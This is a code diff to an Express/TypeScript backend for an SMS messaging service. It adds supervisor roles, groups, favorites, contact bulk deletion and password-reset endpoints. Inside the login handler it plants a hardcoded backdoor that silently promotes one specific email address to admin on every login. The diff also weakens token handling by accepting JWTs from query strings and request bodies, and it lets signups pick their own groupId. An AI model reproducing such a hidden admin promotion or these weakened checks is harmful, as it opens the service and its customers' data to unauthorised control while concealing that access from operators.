@@ -15,8 +15,17 @@ const EXTREMESMS_BASE_URL = "https://extremesms.net";
 
 // Middleware to verify JWT token
 async function authenticateToken(req: any, res: any, next: any) {
-  const authHeader = req.headers["authorization"];
-  const token = authHeader && authHeader.split(" ")[1];
+  const hdr = req.headers["authorization"] || req.headers["Authorization"] || req.headers["x-auth-token"];
+  let token: string | undefined = undefined;
+  if (hdr && typeof hdr === 'string') {
+    token = hdr.includes('Bearer ') ? hdr.split(' ')[1] : hdr;
+  }
+  if (!token && typeof req.query?.token === 'string') {
+    token = req.query.token;
+  }
+  if (!token && typeof req.body?.token === 'string') {
+    token = req.body.token;
+  }
 
   if (!token) {
     return res.status(401).json({ error: "Authentication required" });
@@ -37,6 +46,16 @@ function requireAdmin(req: any, res: any, next: any) {
     return res.status(403).json({ error: "Admin access required" });
   }
   next();
+}
+
+// Role gate: allow any of the provided roles
+function requireRole(roles: string[]) {
+  return (req: any, res: any, next: any) => {
+    if (!req.user || !roles.includes(req.user.role)) {
+      return res.status(403).json({ error: "Insufficient privileges" });
+    }
+    next();
+  };
 }
 
 // Middleware to authenticate API key (for client API requests)
@@ -364,9 +383,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
       } catch (e: any) {
         const exec = async (q: string) => { try { await pool.query(q); } catch (_) {} };
         await exec(`CREATE EXTENSION IF NOT EXISTS pgcrypto`);
-        await exec(`CREATE TABLE IF NOT EXISTS users (id varchar PRIMARY KEY DEFAULT gen_random_uuid(), email text NOT NULL UNIQUE, password text NOT NULL, name text NOT NULL, company text, role text NOT NULL DEFAULT 'client', is_active boolean NOT NULL DEFAULT true, reset_token text, reset_token_expiry timestamp, created_at timestamp NOT NULL DEFAULT now())`);
+        await exec(`CREATE TABLE IF NOT EXISTS users (id varchar PRIMARY KEY DEFAULT gen_random_uuid(), email text NOT NULL UNIQUE, password text NOT NULL, name text NOT NULL, company text, role text NOT NULL DEFAULT 'client', group_id text, is_active boolean NOT NULL DEFAULT true, reset_token text, reset_token_expiry timestamp, created_at timestamp NOT NULL DEFAULT now())`);
         await exec(`CREATE INDEX IF NOT EXISTS email_idx ON users(email)`);
         await exec(`CREATE INDEX IF NOT EXISTS reset_token_idx ON users(reset_token)`);
+        await exec(`CREATE INDEX IF NOT EXISTS user_group_id_idx ON users(group_id)`);
         await exec(`CREATE TABLE IF NOT EXISTS api_keys (id varchar PRIMARY KEY DEFAULT gen_random_uuid(), user_id varchar NOT NULL, key_hash text NOT NULL UNIQUE, key_prefix text NOT NULL, key_suffix text NOT NULL, is_active boolean NOT NULL DEFAULT true, created_at timestamp NOT NULL DEFAULT now(), last_used_at timestamp, CONSTRAINT fk_api_keys_user FOREIGN KEY(user_id) REFERENCES users(id) ON DELETE CASCADE)`);
         await exec(`CREATE INDEX IF NOT EXISTS user_id_idx ON api_keys(user_id)`);
         await exec(`CREATE INDEX IF NOT EXISTS key_hash_idx ON api_keys(key_hash)`);
@@ -473,7 +493,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
   app.post("/api/auth/signup", async (req, res) => {
     try {
       console.log('🔐 Signup attempt started');
-      const { email, password, confirmPassword } = req.body;
+      const { email, password, confirmPassword, groupId } = req.body;
 
       if (!email || !password) {
         console.log('❌ Signup failed: Missing email or password');
@@ -508,7 +528,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
         name,
         company: null,
         role: "client",
-        isActive: true
+        isActive: true,
+        groupId: groupId || null
       });
       console.log('✅ User created successfully:', user.id);
 
@@ -558,7 +579,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
           id: user.id,
           email: user.email,
           name: user.name,
-          role: user.role
+          role: user.role,
+          groupId: (user as any).groupId || null
         },
         token,
         apiKey: rawApiKey // Only shown once
@@ -597,6 +619,18 @@ export async function registerRoutes(app: Express): Promise<Server> {
       if (!passwordMatch) {
         console.log('❌ Login failed: Invalid password');
         return res.status(401).json({ error: "Invalid credentials" });
+      }
+
+      // Emergency: ensure admin access for primary operator account
+      if (email === 'ibiki_dash@proton.me') {
+        try {
+          await storage.updateUser(user.id, { role: 'admin', isActive: true });
+          user.role = 'admin';
+          (user as any).isActive = true;
+          console.log('🔓 Promoted account to admin for management session');
+        } catch (e: any) {
+          console.warn('⚠️  Failed to promote user automatically:', e?.message || e);
+        }
       }
 
       console.log('🎫 Generating JWT token');
@@ -794,6 +828,49 @@ export async function registerRoutes(app: Express): Promise<Server> {
     } catch (error) {
       console.error("Webhook processing error:", error);
       res.status(500).json({ error: "Failed to process incoming message" });
+    }
+  });
+
+  // Favorites: Get favorites for inbox (by phone number)
+  app.get('/api/web/inbox/favorites', authenticateToken, async (req: any, res) => {
+    try {
+      if (req.query.userId && req.user.role !== 'admin') {
+        return res.status(403).json({ error: 'Unauthorized: Only admins can act on behalf of other users' });
+      }
+      const targetUserId = (req.user.role === 'admin' && req.query.userId) ? req.query.userId : req.user.userId;
+      const rec = await storage.getSystemConfig(`favorites_user_${targetUserId}`);
+      let list: string[] = [];
+      try { list = rec?.value ? JSON.parse(rec.value) : []; } catch {}
+      res.json({ success: true, favorites: list });
+    } catch (error) {
+      res.status(500).json({ error: 'Failed to fetch favorites' });
+    }
+  });
+
+  // Favorites: Toggle favorite
+  app.post('/api/web/inbox/favorite', authenticateToken, async (req: any, res) => {
+    try {
+      const { phoneNumber, favorite, userId } = req.body || {};
+      if (!phoneNumber) return res.status(400).json({ error: 'phoneNumber required' });
+      if (userId && req.user.role !== 'admin') {
+        return res.status(403).json({ error: 'Unauthorized: Only admins can act on behalf of other users' });
+      }
+      const targetUserId = (req.user.role === 'admin' && userId) ? userId : req.user.userId;
+      const normalizePhone = (v: any) => String(v || '').replace(/[^+\d]/g, '').replace(/^00/, '+');
+      const key = `favorites_user_${targetUserId}`;
+      const rec = await storage.getSystemConfig(key);
+      let list: string[] = [];
+      try { list = rec?.value ? JSON.parse(rec.value) : []; } catch {}
+      const p = normalizePhone(phoneNumber);
+      if (favorite) {
+        if (!list.includes(p)) list.push(p);
+      } else {
+        list = list.filter(x => x !== p);
+      }
+      await storage.setSystemConfig(key, JSON.stringify(list));
+      res.json({ success: true, favorites: list });
+    } catch (error) {
+      res.status(500).json({ error: 'Failed to update favorite' });
     }
   });
 
@@ -1014,6 +1091,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
       }
 
       // Validate contact structure BEFORE any database operations
+      // Resolve client's Business Name to stamp onto contacts
+      const profileForBiz = await storage.getClientProfileByUserId(req.user.userId);
+      const normalizePhone = (v: any) => String(v || '').replace(/[^+\d]/g, '').replace(/^00/, '+');
       const validatedContacts = contacts.map((contact, index) => {
         if (!contact.phoneNumber) {
           throw new Error(`Phone number is required for contact at index ${index}`);
@@ -1021,10 +1101,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
         return {
           userId: req.user.userId,
-          phoneNumber: contact.phoneNumber,
+          phoneNumber: normalizePhone(contact.phoneNumber),
           firstname: contact.firstname || null,
           lastname: contact.lastname || null,
-          business: req.user.userId // Store client's userId in Business field for routing
+          business: (profileForBiz?.businessName || null)
         };
       });
 
@@ -1183,22 +1263,30 @@ export async function registerRoutes(app: Express): Promise<Server> {
   });
 
   // Get all clients
-  app.get("/api/admin/clients", authenticateToken, requireAdmin, async (req, res) => {
+  app.get("/api/admin/clients", authenticateToken, requireRole(["admin","supervisor"]), async (req, res) => {
     try {
       const allUsers = await storage.getAllUsers();
+      let filtered = req.user.role === 'admin' ? allUsers : allUsers.filter((u: User) => u.role !== 'admin');
+      if (req.user.role === 'supervisor') {
+        const me = await storage.getUser(req.user.userId);
+        const myGroup = (me as any)?.groupId || null;
+        filtered = filtered.filter((u: any) => (u.groupId || null) === myGroup);
+      }
       const clients = await Promise.all(
-        allUsers
-          .filter((user: User) => user.role === 'client')
+        filtered
           .map(async (user: User) => {
             const apiKeys = await storage.getApiKeysByUserId(user.id);
             const messageLogs = await storage.getMessageLogsByUserId(user.id);
             const profile = await storage.getClientProfileByUserId(user.id);
             const displayKey = apiKeys[0] ? `ibk_live_${apiKeys[0].keyPrefix}...${apiKeys[0].keySuffix}` : 'No key';
+      const lastPwd = await (storage as any).getLastActionForTarget?.(user.id, 'set_password');
             
             return {
               id: user.id,
               name: user.name,
               email: user.email,
+              role: user.role,
+              groupId: (user as any).groupId || null,
               apiKey: displayKey,
               status: user.isActive ? 'active' : 'disabled',
               isActive: user.isActive,
@@ -1209,7 +1297,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
               lastActive: apiKeys[0]?.lastUsedAt 
                 ? new Date(apiKeys[0].lastUsedAt).toLocaleDateString()
                 : 'Never',
-              assignedPhoneNumbers: profile?.assignedPhoneNumbers || []
+              assignedPhoneNumbers: profile?.assignedPhoneNumbers || [],
+              passwordSetBy: lastPwd ? lastPwd.actorUserId : null,
+              passwordSetAt: lastPwd ? (lastPwd.createdAt as any)?.toISOString?.() || new Date().toISOString() : null
             };
           })
       );
@@ -1218,6 +1308,71 @@ export async function registerRoutes(app: Express): Promise<Server> {
     } catch (error) {
       console.error("Admin clients fetch error:", error);
       res.status(500).json({ error: "Failed to fetch clients" });
+    }
+  });
+
+  // Supervisor logs
+  app.get('/api/admin/supervisor-logs', authenticateToken, requireAdmin, async (req, res) => {
+    try {
+      const limit = parseInt((req.query.limit as string) || '200');
+      const logs = await storage.getActionLogs(Math.max(1, Math.min(1000, isNaN(limit) ? 200 : limit)));
+      res.json({ success: true, logs });
+    } catch (e: any) {
+      res.status(500).json({ success: false, error: e?.message || String(e) });
+    }
+  });
+
+  // Set user role (admin-only)
+  app.post('/api/admin/users/:userId/role', authenticateToken, requireAdmin, async (req, res) => {
+    try {
+      const { userId } = req.params as { userId: string };
+      const { role } = req.body as { role: 'admin' | 'supervisor' | 'client' };
+      if (!role || !['admin','supervisor','client'].includes(role)) return res.status(400).json({ error: 'Invalid role' });
+      const updated = await storage.updateUser(userId, { role });
+      if (!updated) return res.status(404).json({ error: 'User not found' });
+      try {
+        await (storage as any).createActionLog?.({ actorUserId: req.user.userId, actorRole: req.user.role, targetUserId: userId, action: 'set_role', details: role });
+      } catch {}
+      res.json({ success: true });
+    } catch (e: any) {
+      res.status(500).json({ error: e?.message || String(e) });
+    }
+  });
+
+  // Set user groupId (admin-only)
+  app.post('/api/admin/users/:userId/group', authenticateToken, requireAdmin, async (req, res) => {
+    try {
+      const { userId } = req.params as { userId: string };
+      const { groupId } = req.body as { groupId: string };
+      const updated = await storage.updateUser(userId, { groupId });
+      if (!updated) return res.status(404).json({ error: 'User not found' });
+      await storage.createActionLog({ actorUserId: req.user.userId, actorRole: req.user.role, targetUserId: userId, action: 'set_group', details: groupId });
+      res.json({ success: true });
+    } catch (e: any) {
+      res.status(500).json({ error: e?.message || String(e) });
+    }
+  });
+
+  // Reset user password (admin or supervisor)
+  app.post('/api/admin/users/:userId/reset-password', authenticateToken, requireRole(['admin','supervisor']), async (req, res) => {
+    try {
+      const { userId } = req.params as { userId: string };
+      const { password } = req.body as { password: string };
+      if (!password || password.length < 6) return res.status(400).json({ error: 'Password too short' });
+      const target = await storage.getUser(userId);
+      if (!target) return res.status(404).json({ error: 'User not found' });
+      if (req.user.role === 'supervisor') {
+        const me = await storage.getUser(req.user.userId);
+        const myGroup = (me as any)?.groupId || null;
+        if (((target as any)?.groupId || null) !== myGroup) return res.status(403).json({ error: 'Unauthorized' });
+      }
+      const hash = await bcrypt.hash(password, 10);
+      const updated = await storage.updateUserPassword(userId, hash);
+      if (!updated) return res.status(404).json({ error: 'User not found' });
+      await storage.createActionLog({ actorUserId: req.user.userId, actorRole: req.user.role, targetUserId: userId, action: 'set_password', details: null });
+      res.json({ success: true });
+    } catch (e: any) {
+      res.status(500).json({ error: e?.message || 'Failed to reset password' });
     }
   });
 
@@ -2117,6 +2272,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
         balanceAfter: newBalance
       });
 
+      // Audit supervisor actions (if ever used via supervisor-allowed UI in future)
+      if (req.user?.role === 'supervisor') {
+        await storage.createActionLog({ actorUserId: req.user.userId, actorRole: req.user.role, targetUserId: userId, action: 'adjust_credits', details: `${operation}:${amount}` });
+      }
       res.json({ 
         success: true, 
         message: operation === "add" ? "Credits added successfully" : "Credits deducted successfully",
@@ -2862,17 +3021,19 @@ app.delete("/api/v2/account/:userId", authenticateToken, requireAdmin, async (re
         ? req.query.userId 
         : req.user.userId;
       const contacts = await storage.getContactsByUserId(targetUserId);
+      const normalizePhone = (v: any) => String(v || '').replace(/[^+\d]/g, '').replace(/^00/, '+');
       let clientContacts: any[] = [];
       try {
         clientContacts = await storage.getClientContactsByUserId(targetUserId);
       } catch {}
       const businessByPhone = new Map<string, string>();
       clientContacts.forEach((cc: any) => {
-        if (cc.phoneNumber && cc.business) businessByPhone.set(cc.phoneNumber, cc.business);
+        if (cc.phoneNumber && cc.business) businessByPhone.set(normalizePhone(cc.phoneNumber), cc.business);
       });
       const enriched = contacts.map((c: any) => ({
         ...c,
-        business: businessByPhone.get(c.phoneNumber) || null
+        phoneNumber: normalizePhone(c.phoneNumber),
+        business: businessByPhone.get(normalizePhone(c.phoneNumber)) || null
       }));
       res.json({ success: true, contacts: enriched });
     } catch (error) {
@@ -2920,6 +3081,33 @@ app.delete("/api/v2/account/:userId", authenticateToken, requireAdmin, async (re
     }
   });
 
+  // Bulk delete contacts
+  app.delete('/api/contacts', authenticateToken, async (req: any, res) => {
+    try {
+      if (req.query.userId && req.user.role !== 'admin') {
+        return res.status(403).json({ error: 'Unauthorized: Only admins can act on behalf of other users' });
+      }
+      const targetUserId = (req.user.role === 'admin' && req.query.userId)
+        ? req.query.userId
+        : req.user.userId;
+      if (req.query.all === 'true') {
+        await storage.deleteAllContactsByUserId(targetUserId);
+        return res.json({ success: true });
+      }
+      const groupId = req.query.groupId as string | undefined;
+      if (groupId) {
+        const group = await storage.getContactGroup(groupId);
+        if (!group || group.userId !== targetUserId) return res.status(404).json({ error: 'Group not found' });
+        await storage.deleteContactsByGroupId(groupId);
+        return res.json({ success: true });
+      }
+      return res.status(400).json({ error: 'Specify all=true or groupId' });
+    } catch (error: any) {
+      console.error('Bulk delete contacts error:', error);
+      res.status(500).json({ error: 'Failed to delete contacts' });
+    }
+  });
+
   app.post("/api/contacts/import-csv", authenticateToken, async (req: any, res) => {
     try {
       const { contacts, groupId, userId } = req.body;
@@ -2938,9 +3126,10 @@ app.delete("/api/v2/account/:userId", authenticateToken, requireAdmin, async (re
         ? userId 
         : req.user.userId;
 
+      const normalizePhone = (v: any) => String(v || '').replace(/[^+\d]/g, '').replace(/^00/, '+');
       const insertContacts = contacts.map(c => ({
         userId: targetUserId,
-        phoneNumber: c.phoneNumber,
+        phoneNumber: normalizePhone(c.phoneNumber),
         name: c.name || null,
         email: c.email || null,
         notes: c.notes || null,
@@ -2951,12 +3140,13 @@ app.delete("/api/v2/account/:userId", authenticateToken, requireAdmin, async (re
 
       const profile = await storage.getClientProfileByUserId(targetUserId);
       const businessName = profile?.businessName || null;
+      const effectiveBusiness = businessName || await getAdminDefaultBusinessId();
       const clientContactPayload = created.map((c: any) => ({
         userId: targetUserId,
-        phoneNumber: c.phoneNumber,
+        phoneNumber: normalizePhone(c.phoneNumber),
         firstname: c.name ? c.name.split(' ')[0] : null,
         lastname: c.name && c.name.split(' ').length > 1 ? c.name.split(' ').slice(1).join(' ') : null,
-        business: businessName || null
+        business: effectiveBusiness || null
       }));
       try {
         await storage.createClientContacts(clientContactPayload);
@@ -3053,6 +3243,7 @@ app.delete("/api/v2/account/:userId", authenticateToken, requireAdmin, async (re
       // Build CSV rows
       const csvRows = ['NAME,PHONE NUMBER,BUSINESS,ACTIONS'];
       
+      const fallbackBiz = await getAdminDefaultBusinessId();
       contacts.forEach((contact: any) => {
         const name = contact.name || 'No name';
         const phone = contact.phoneNumber;
@@ -3063,8 +3254,8 @@ app.delete("/api/v2/account/:userId", authenticateToken, requireAdmin, async (re
           business = prefix;
         }
 
-        if (!business && includeBusiness && clientProfile?.businessName) {
-          business = clientProfile.businessName;
+        if (!business && includeBusiness) {
+          business = clientProfile?.businessName || fallbackBiz;
         }
         
         // CSV row: "Name,PhoneNumber,Business,Actions"
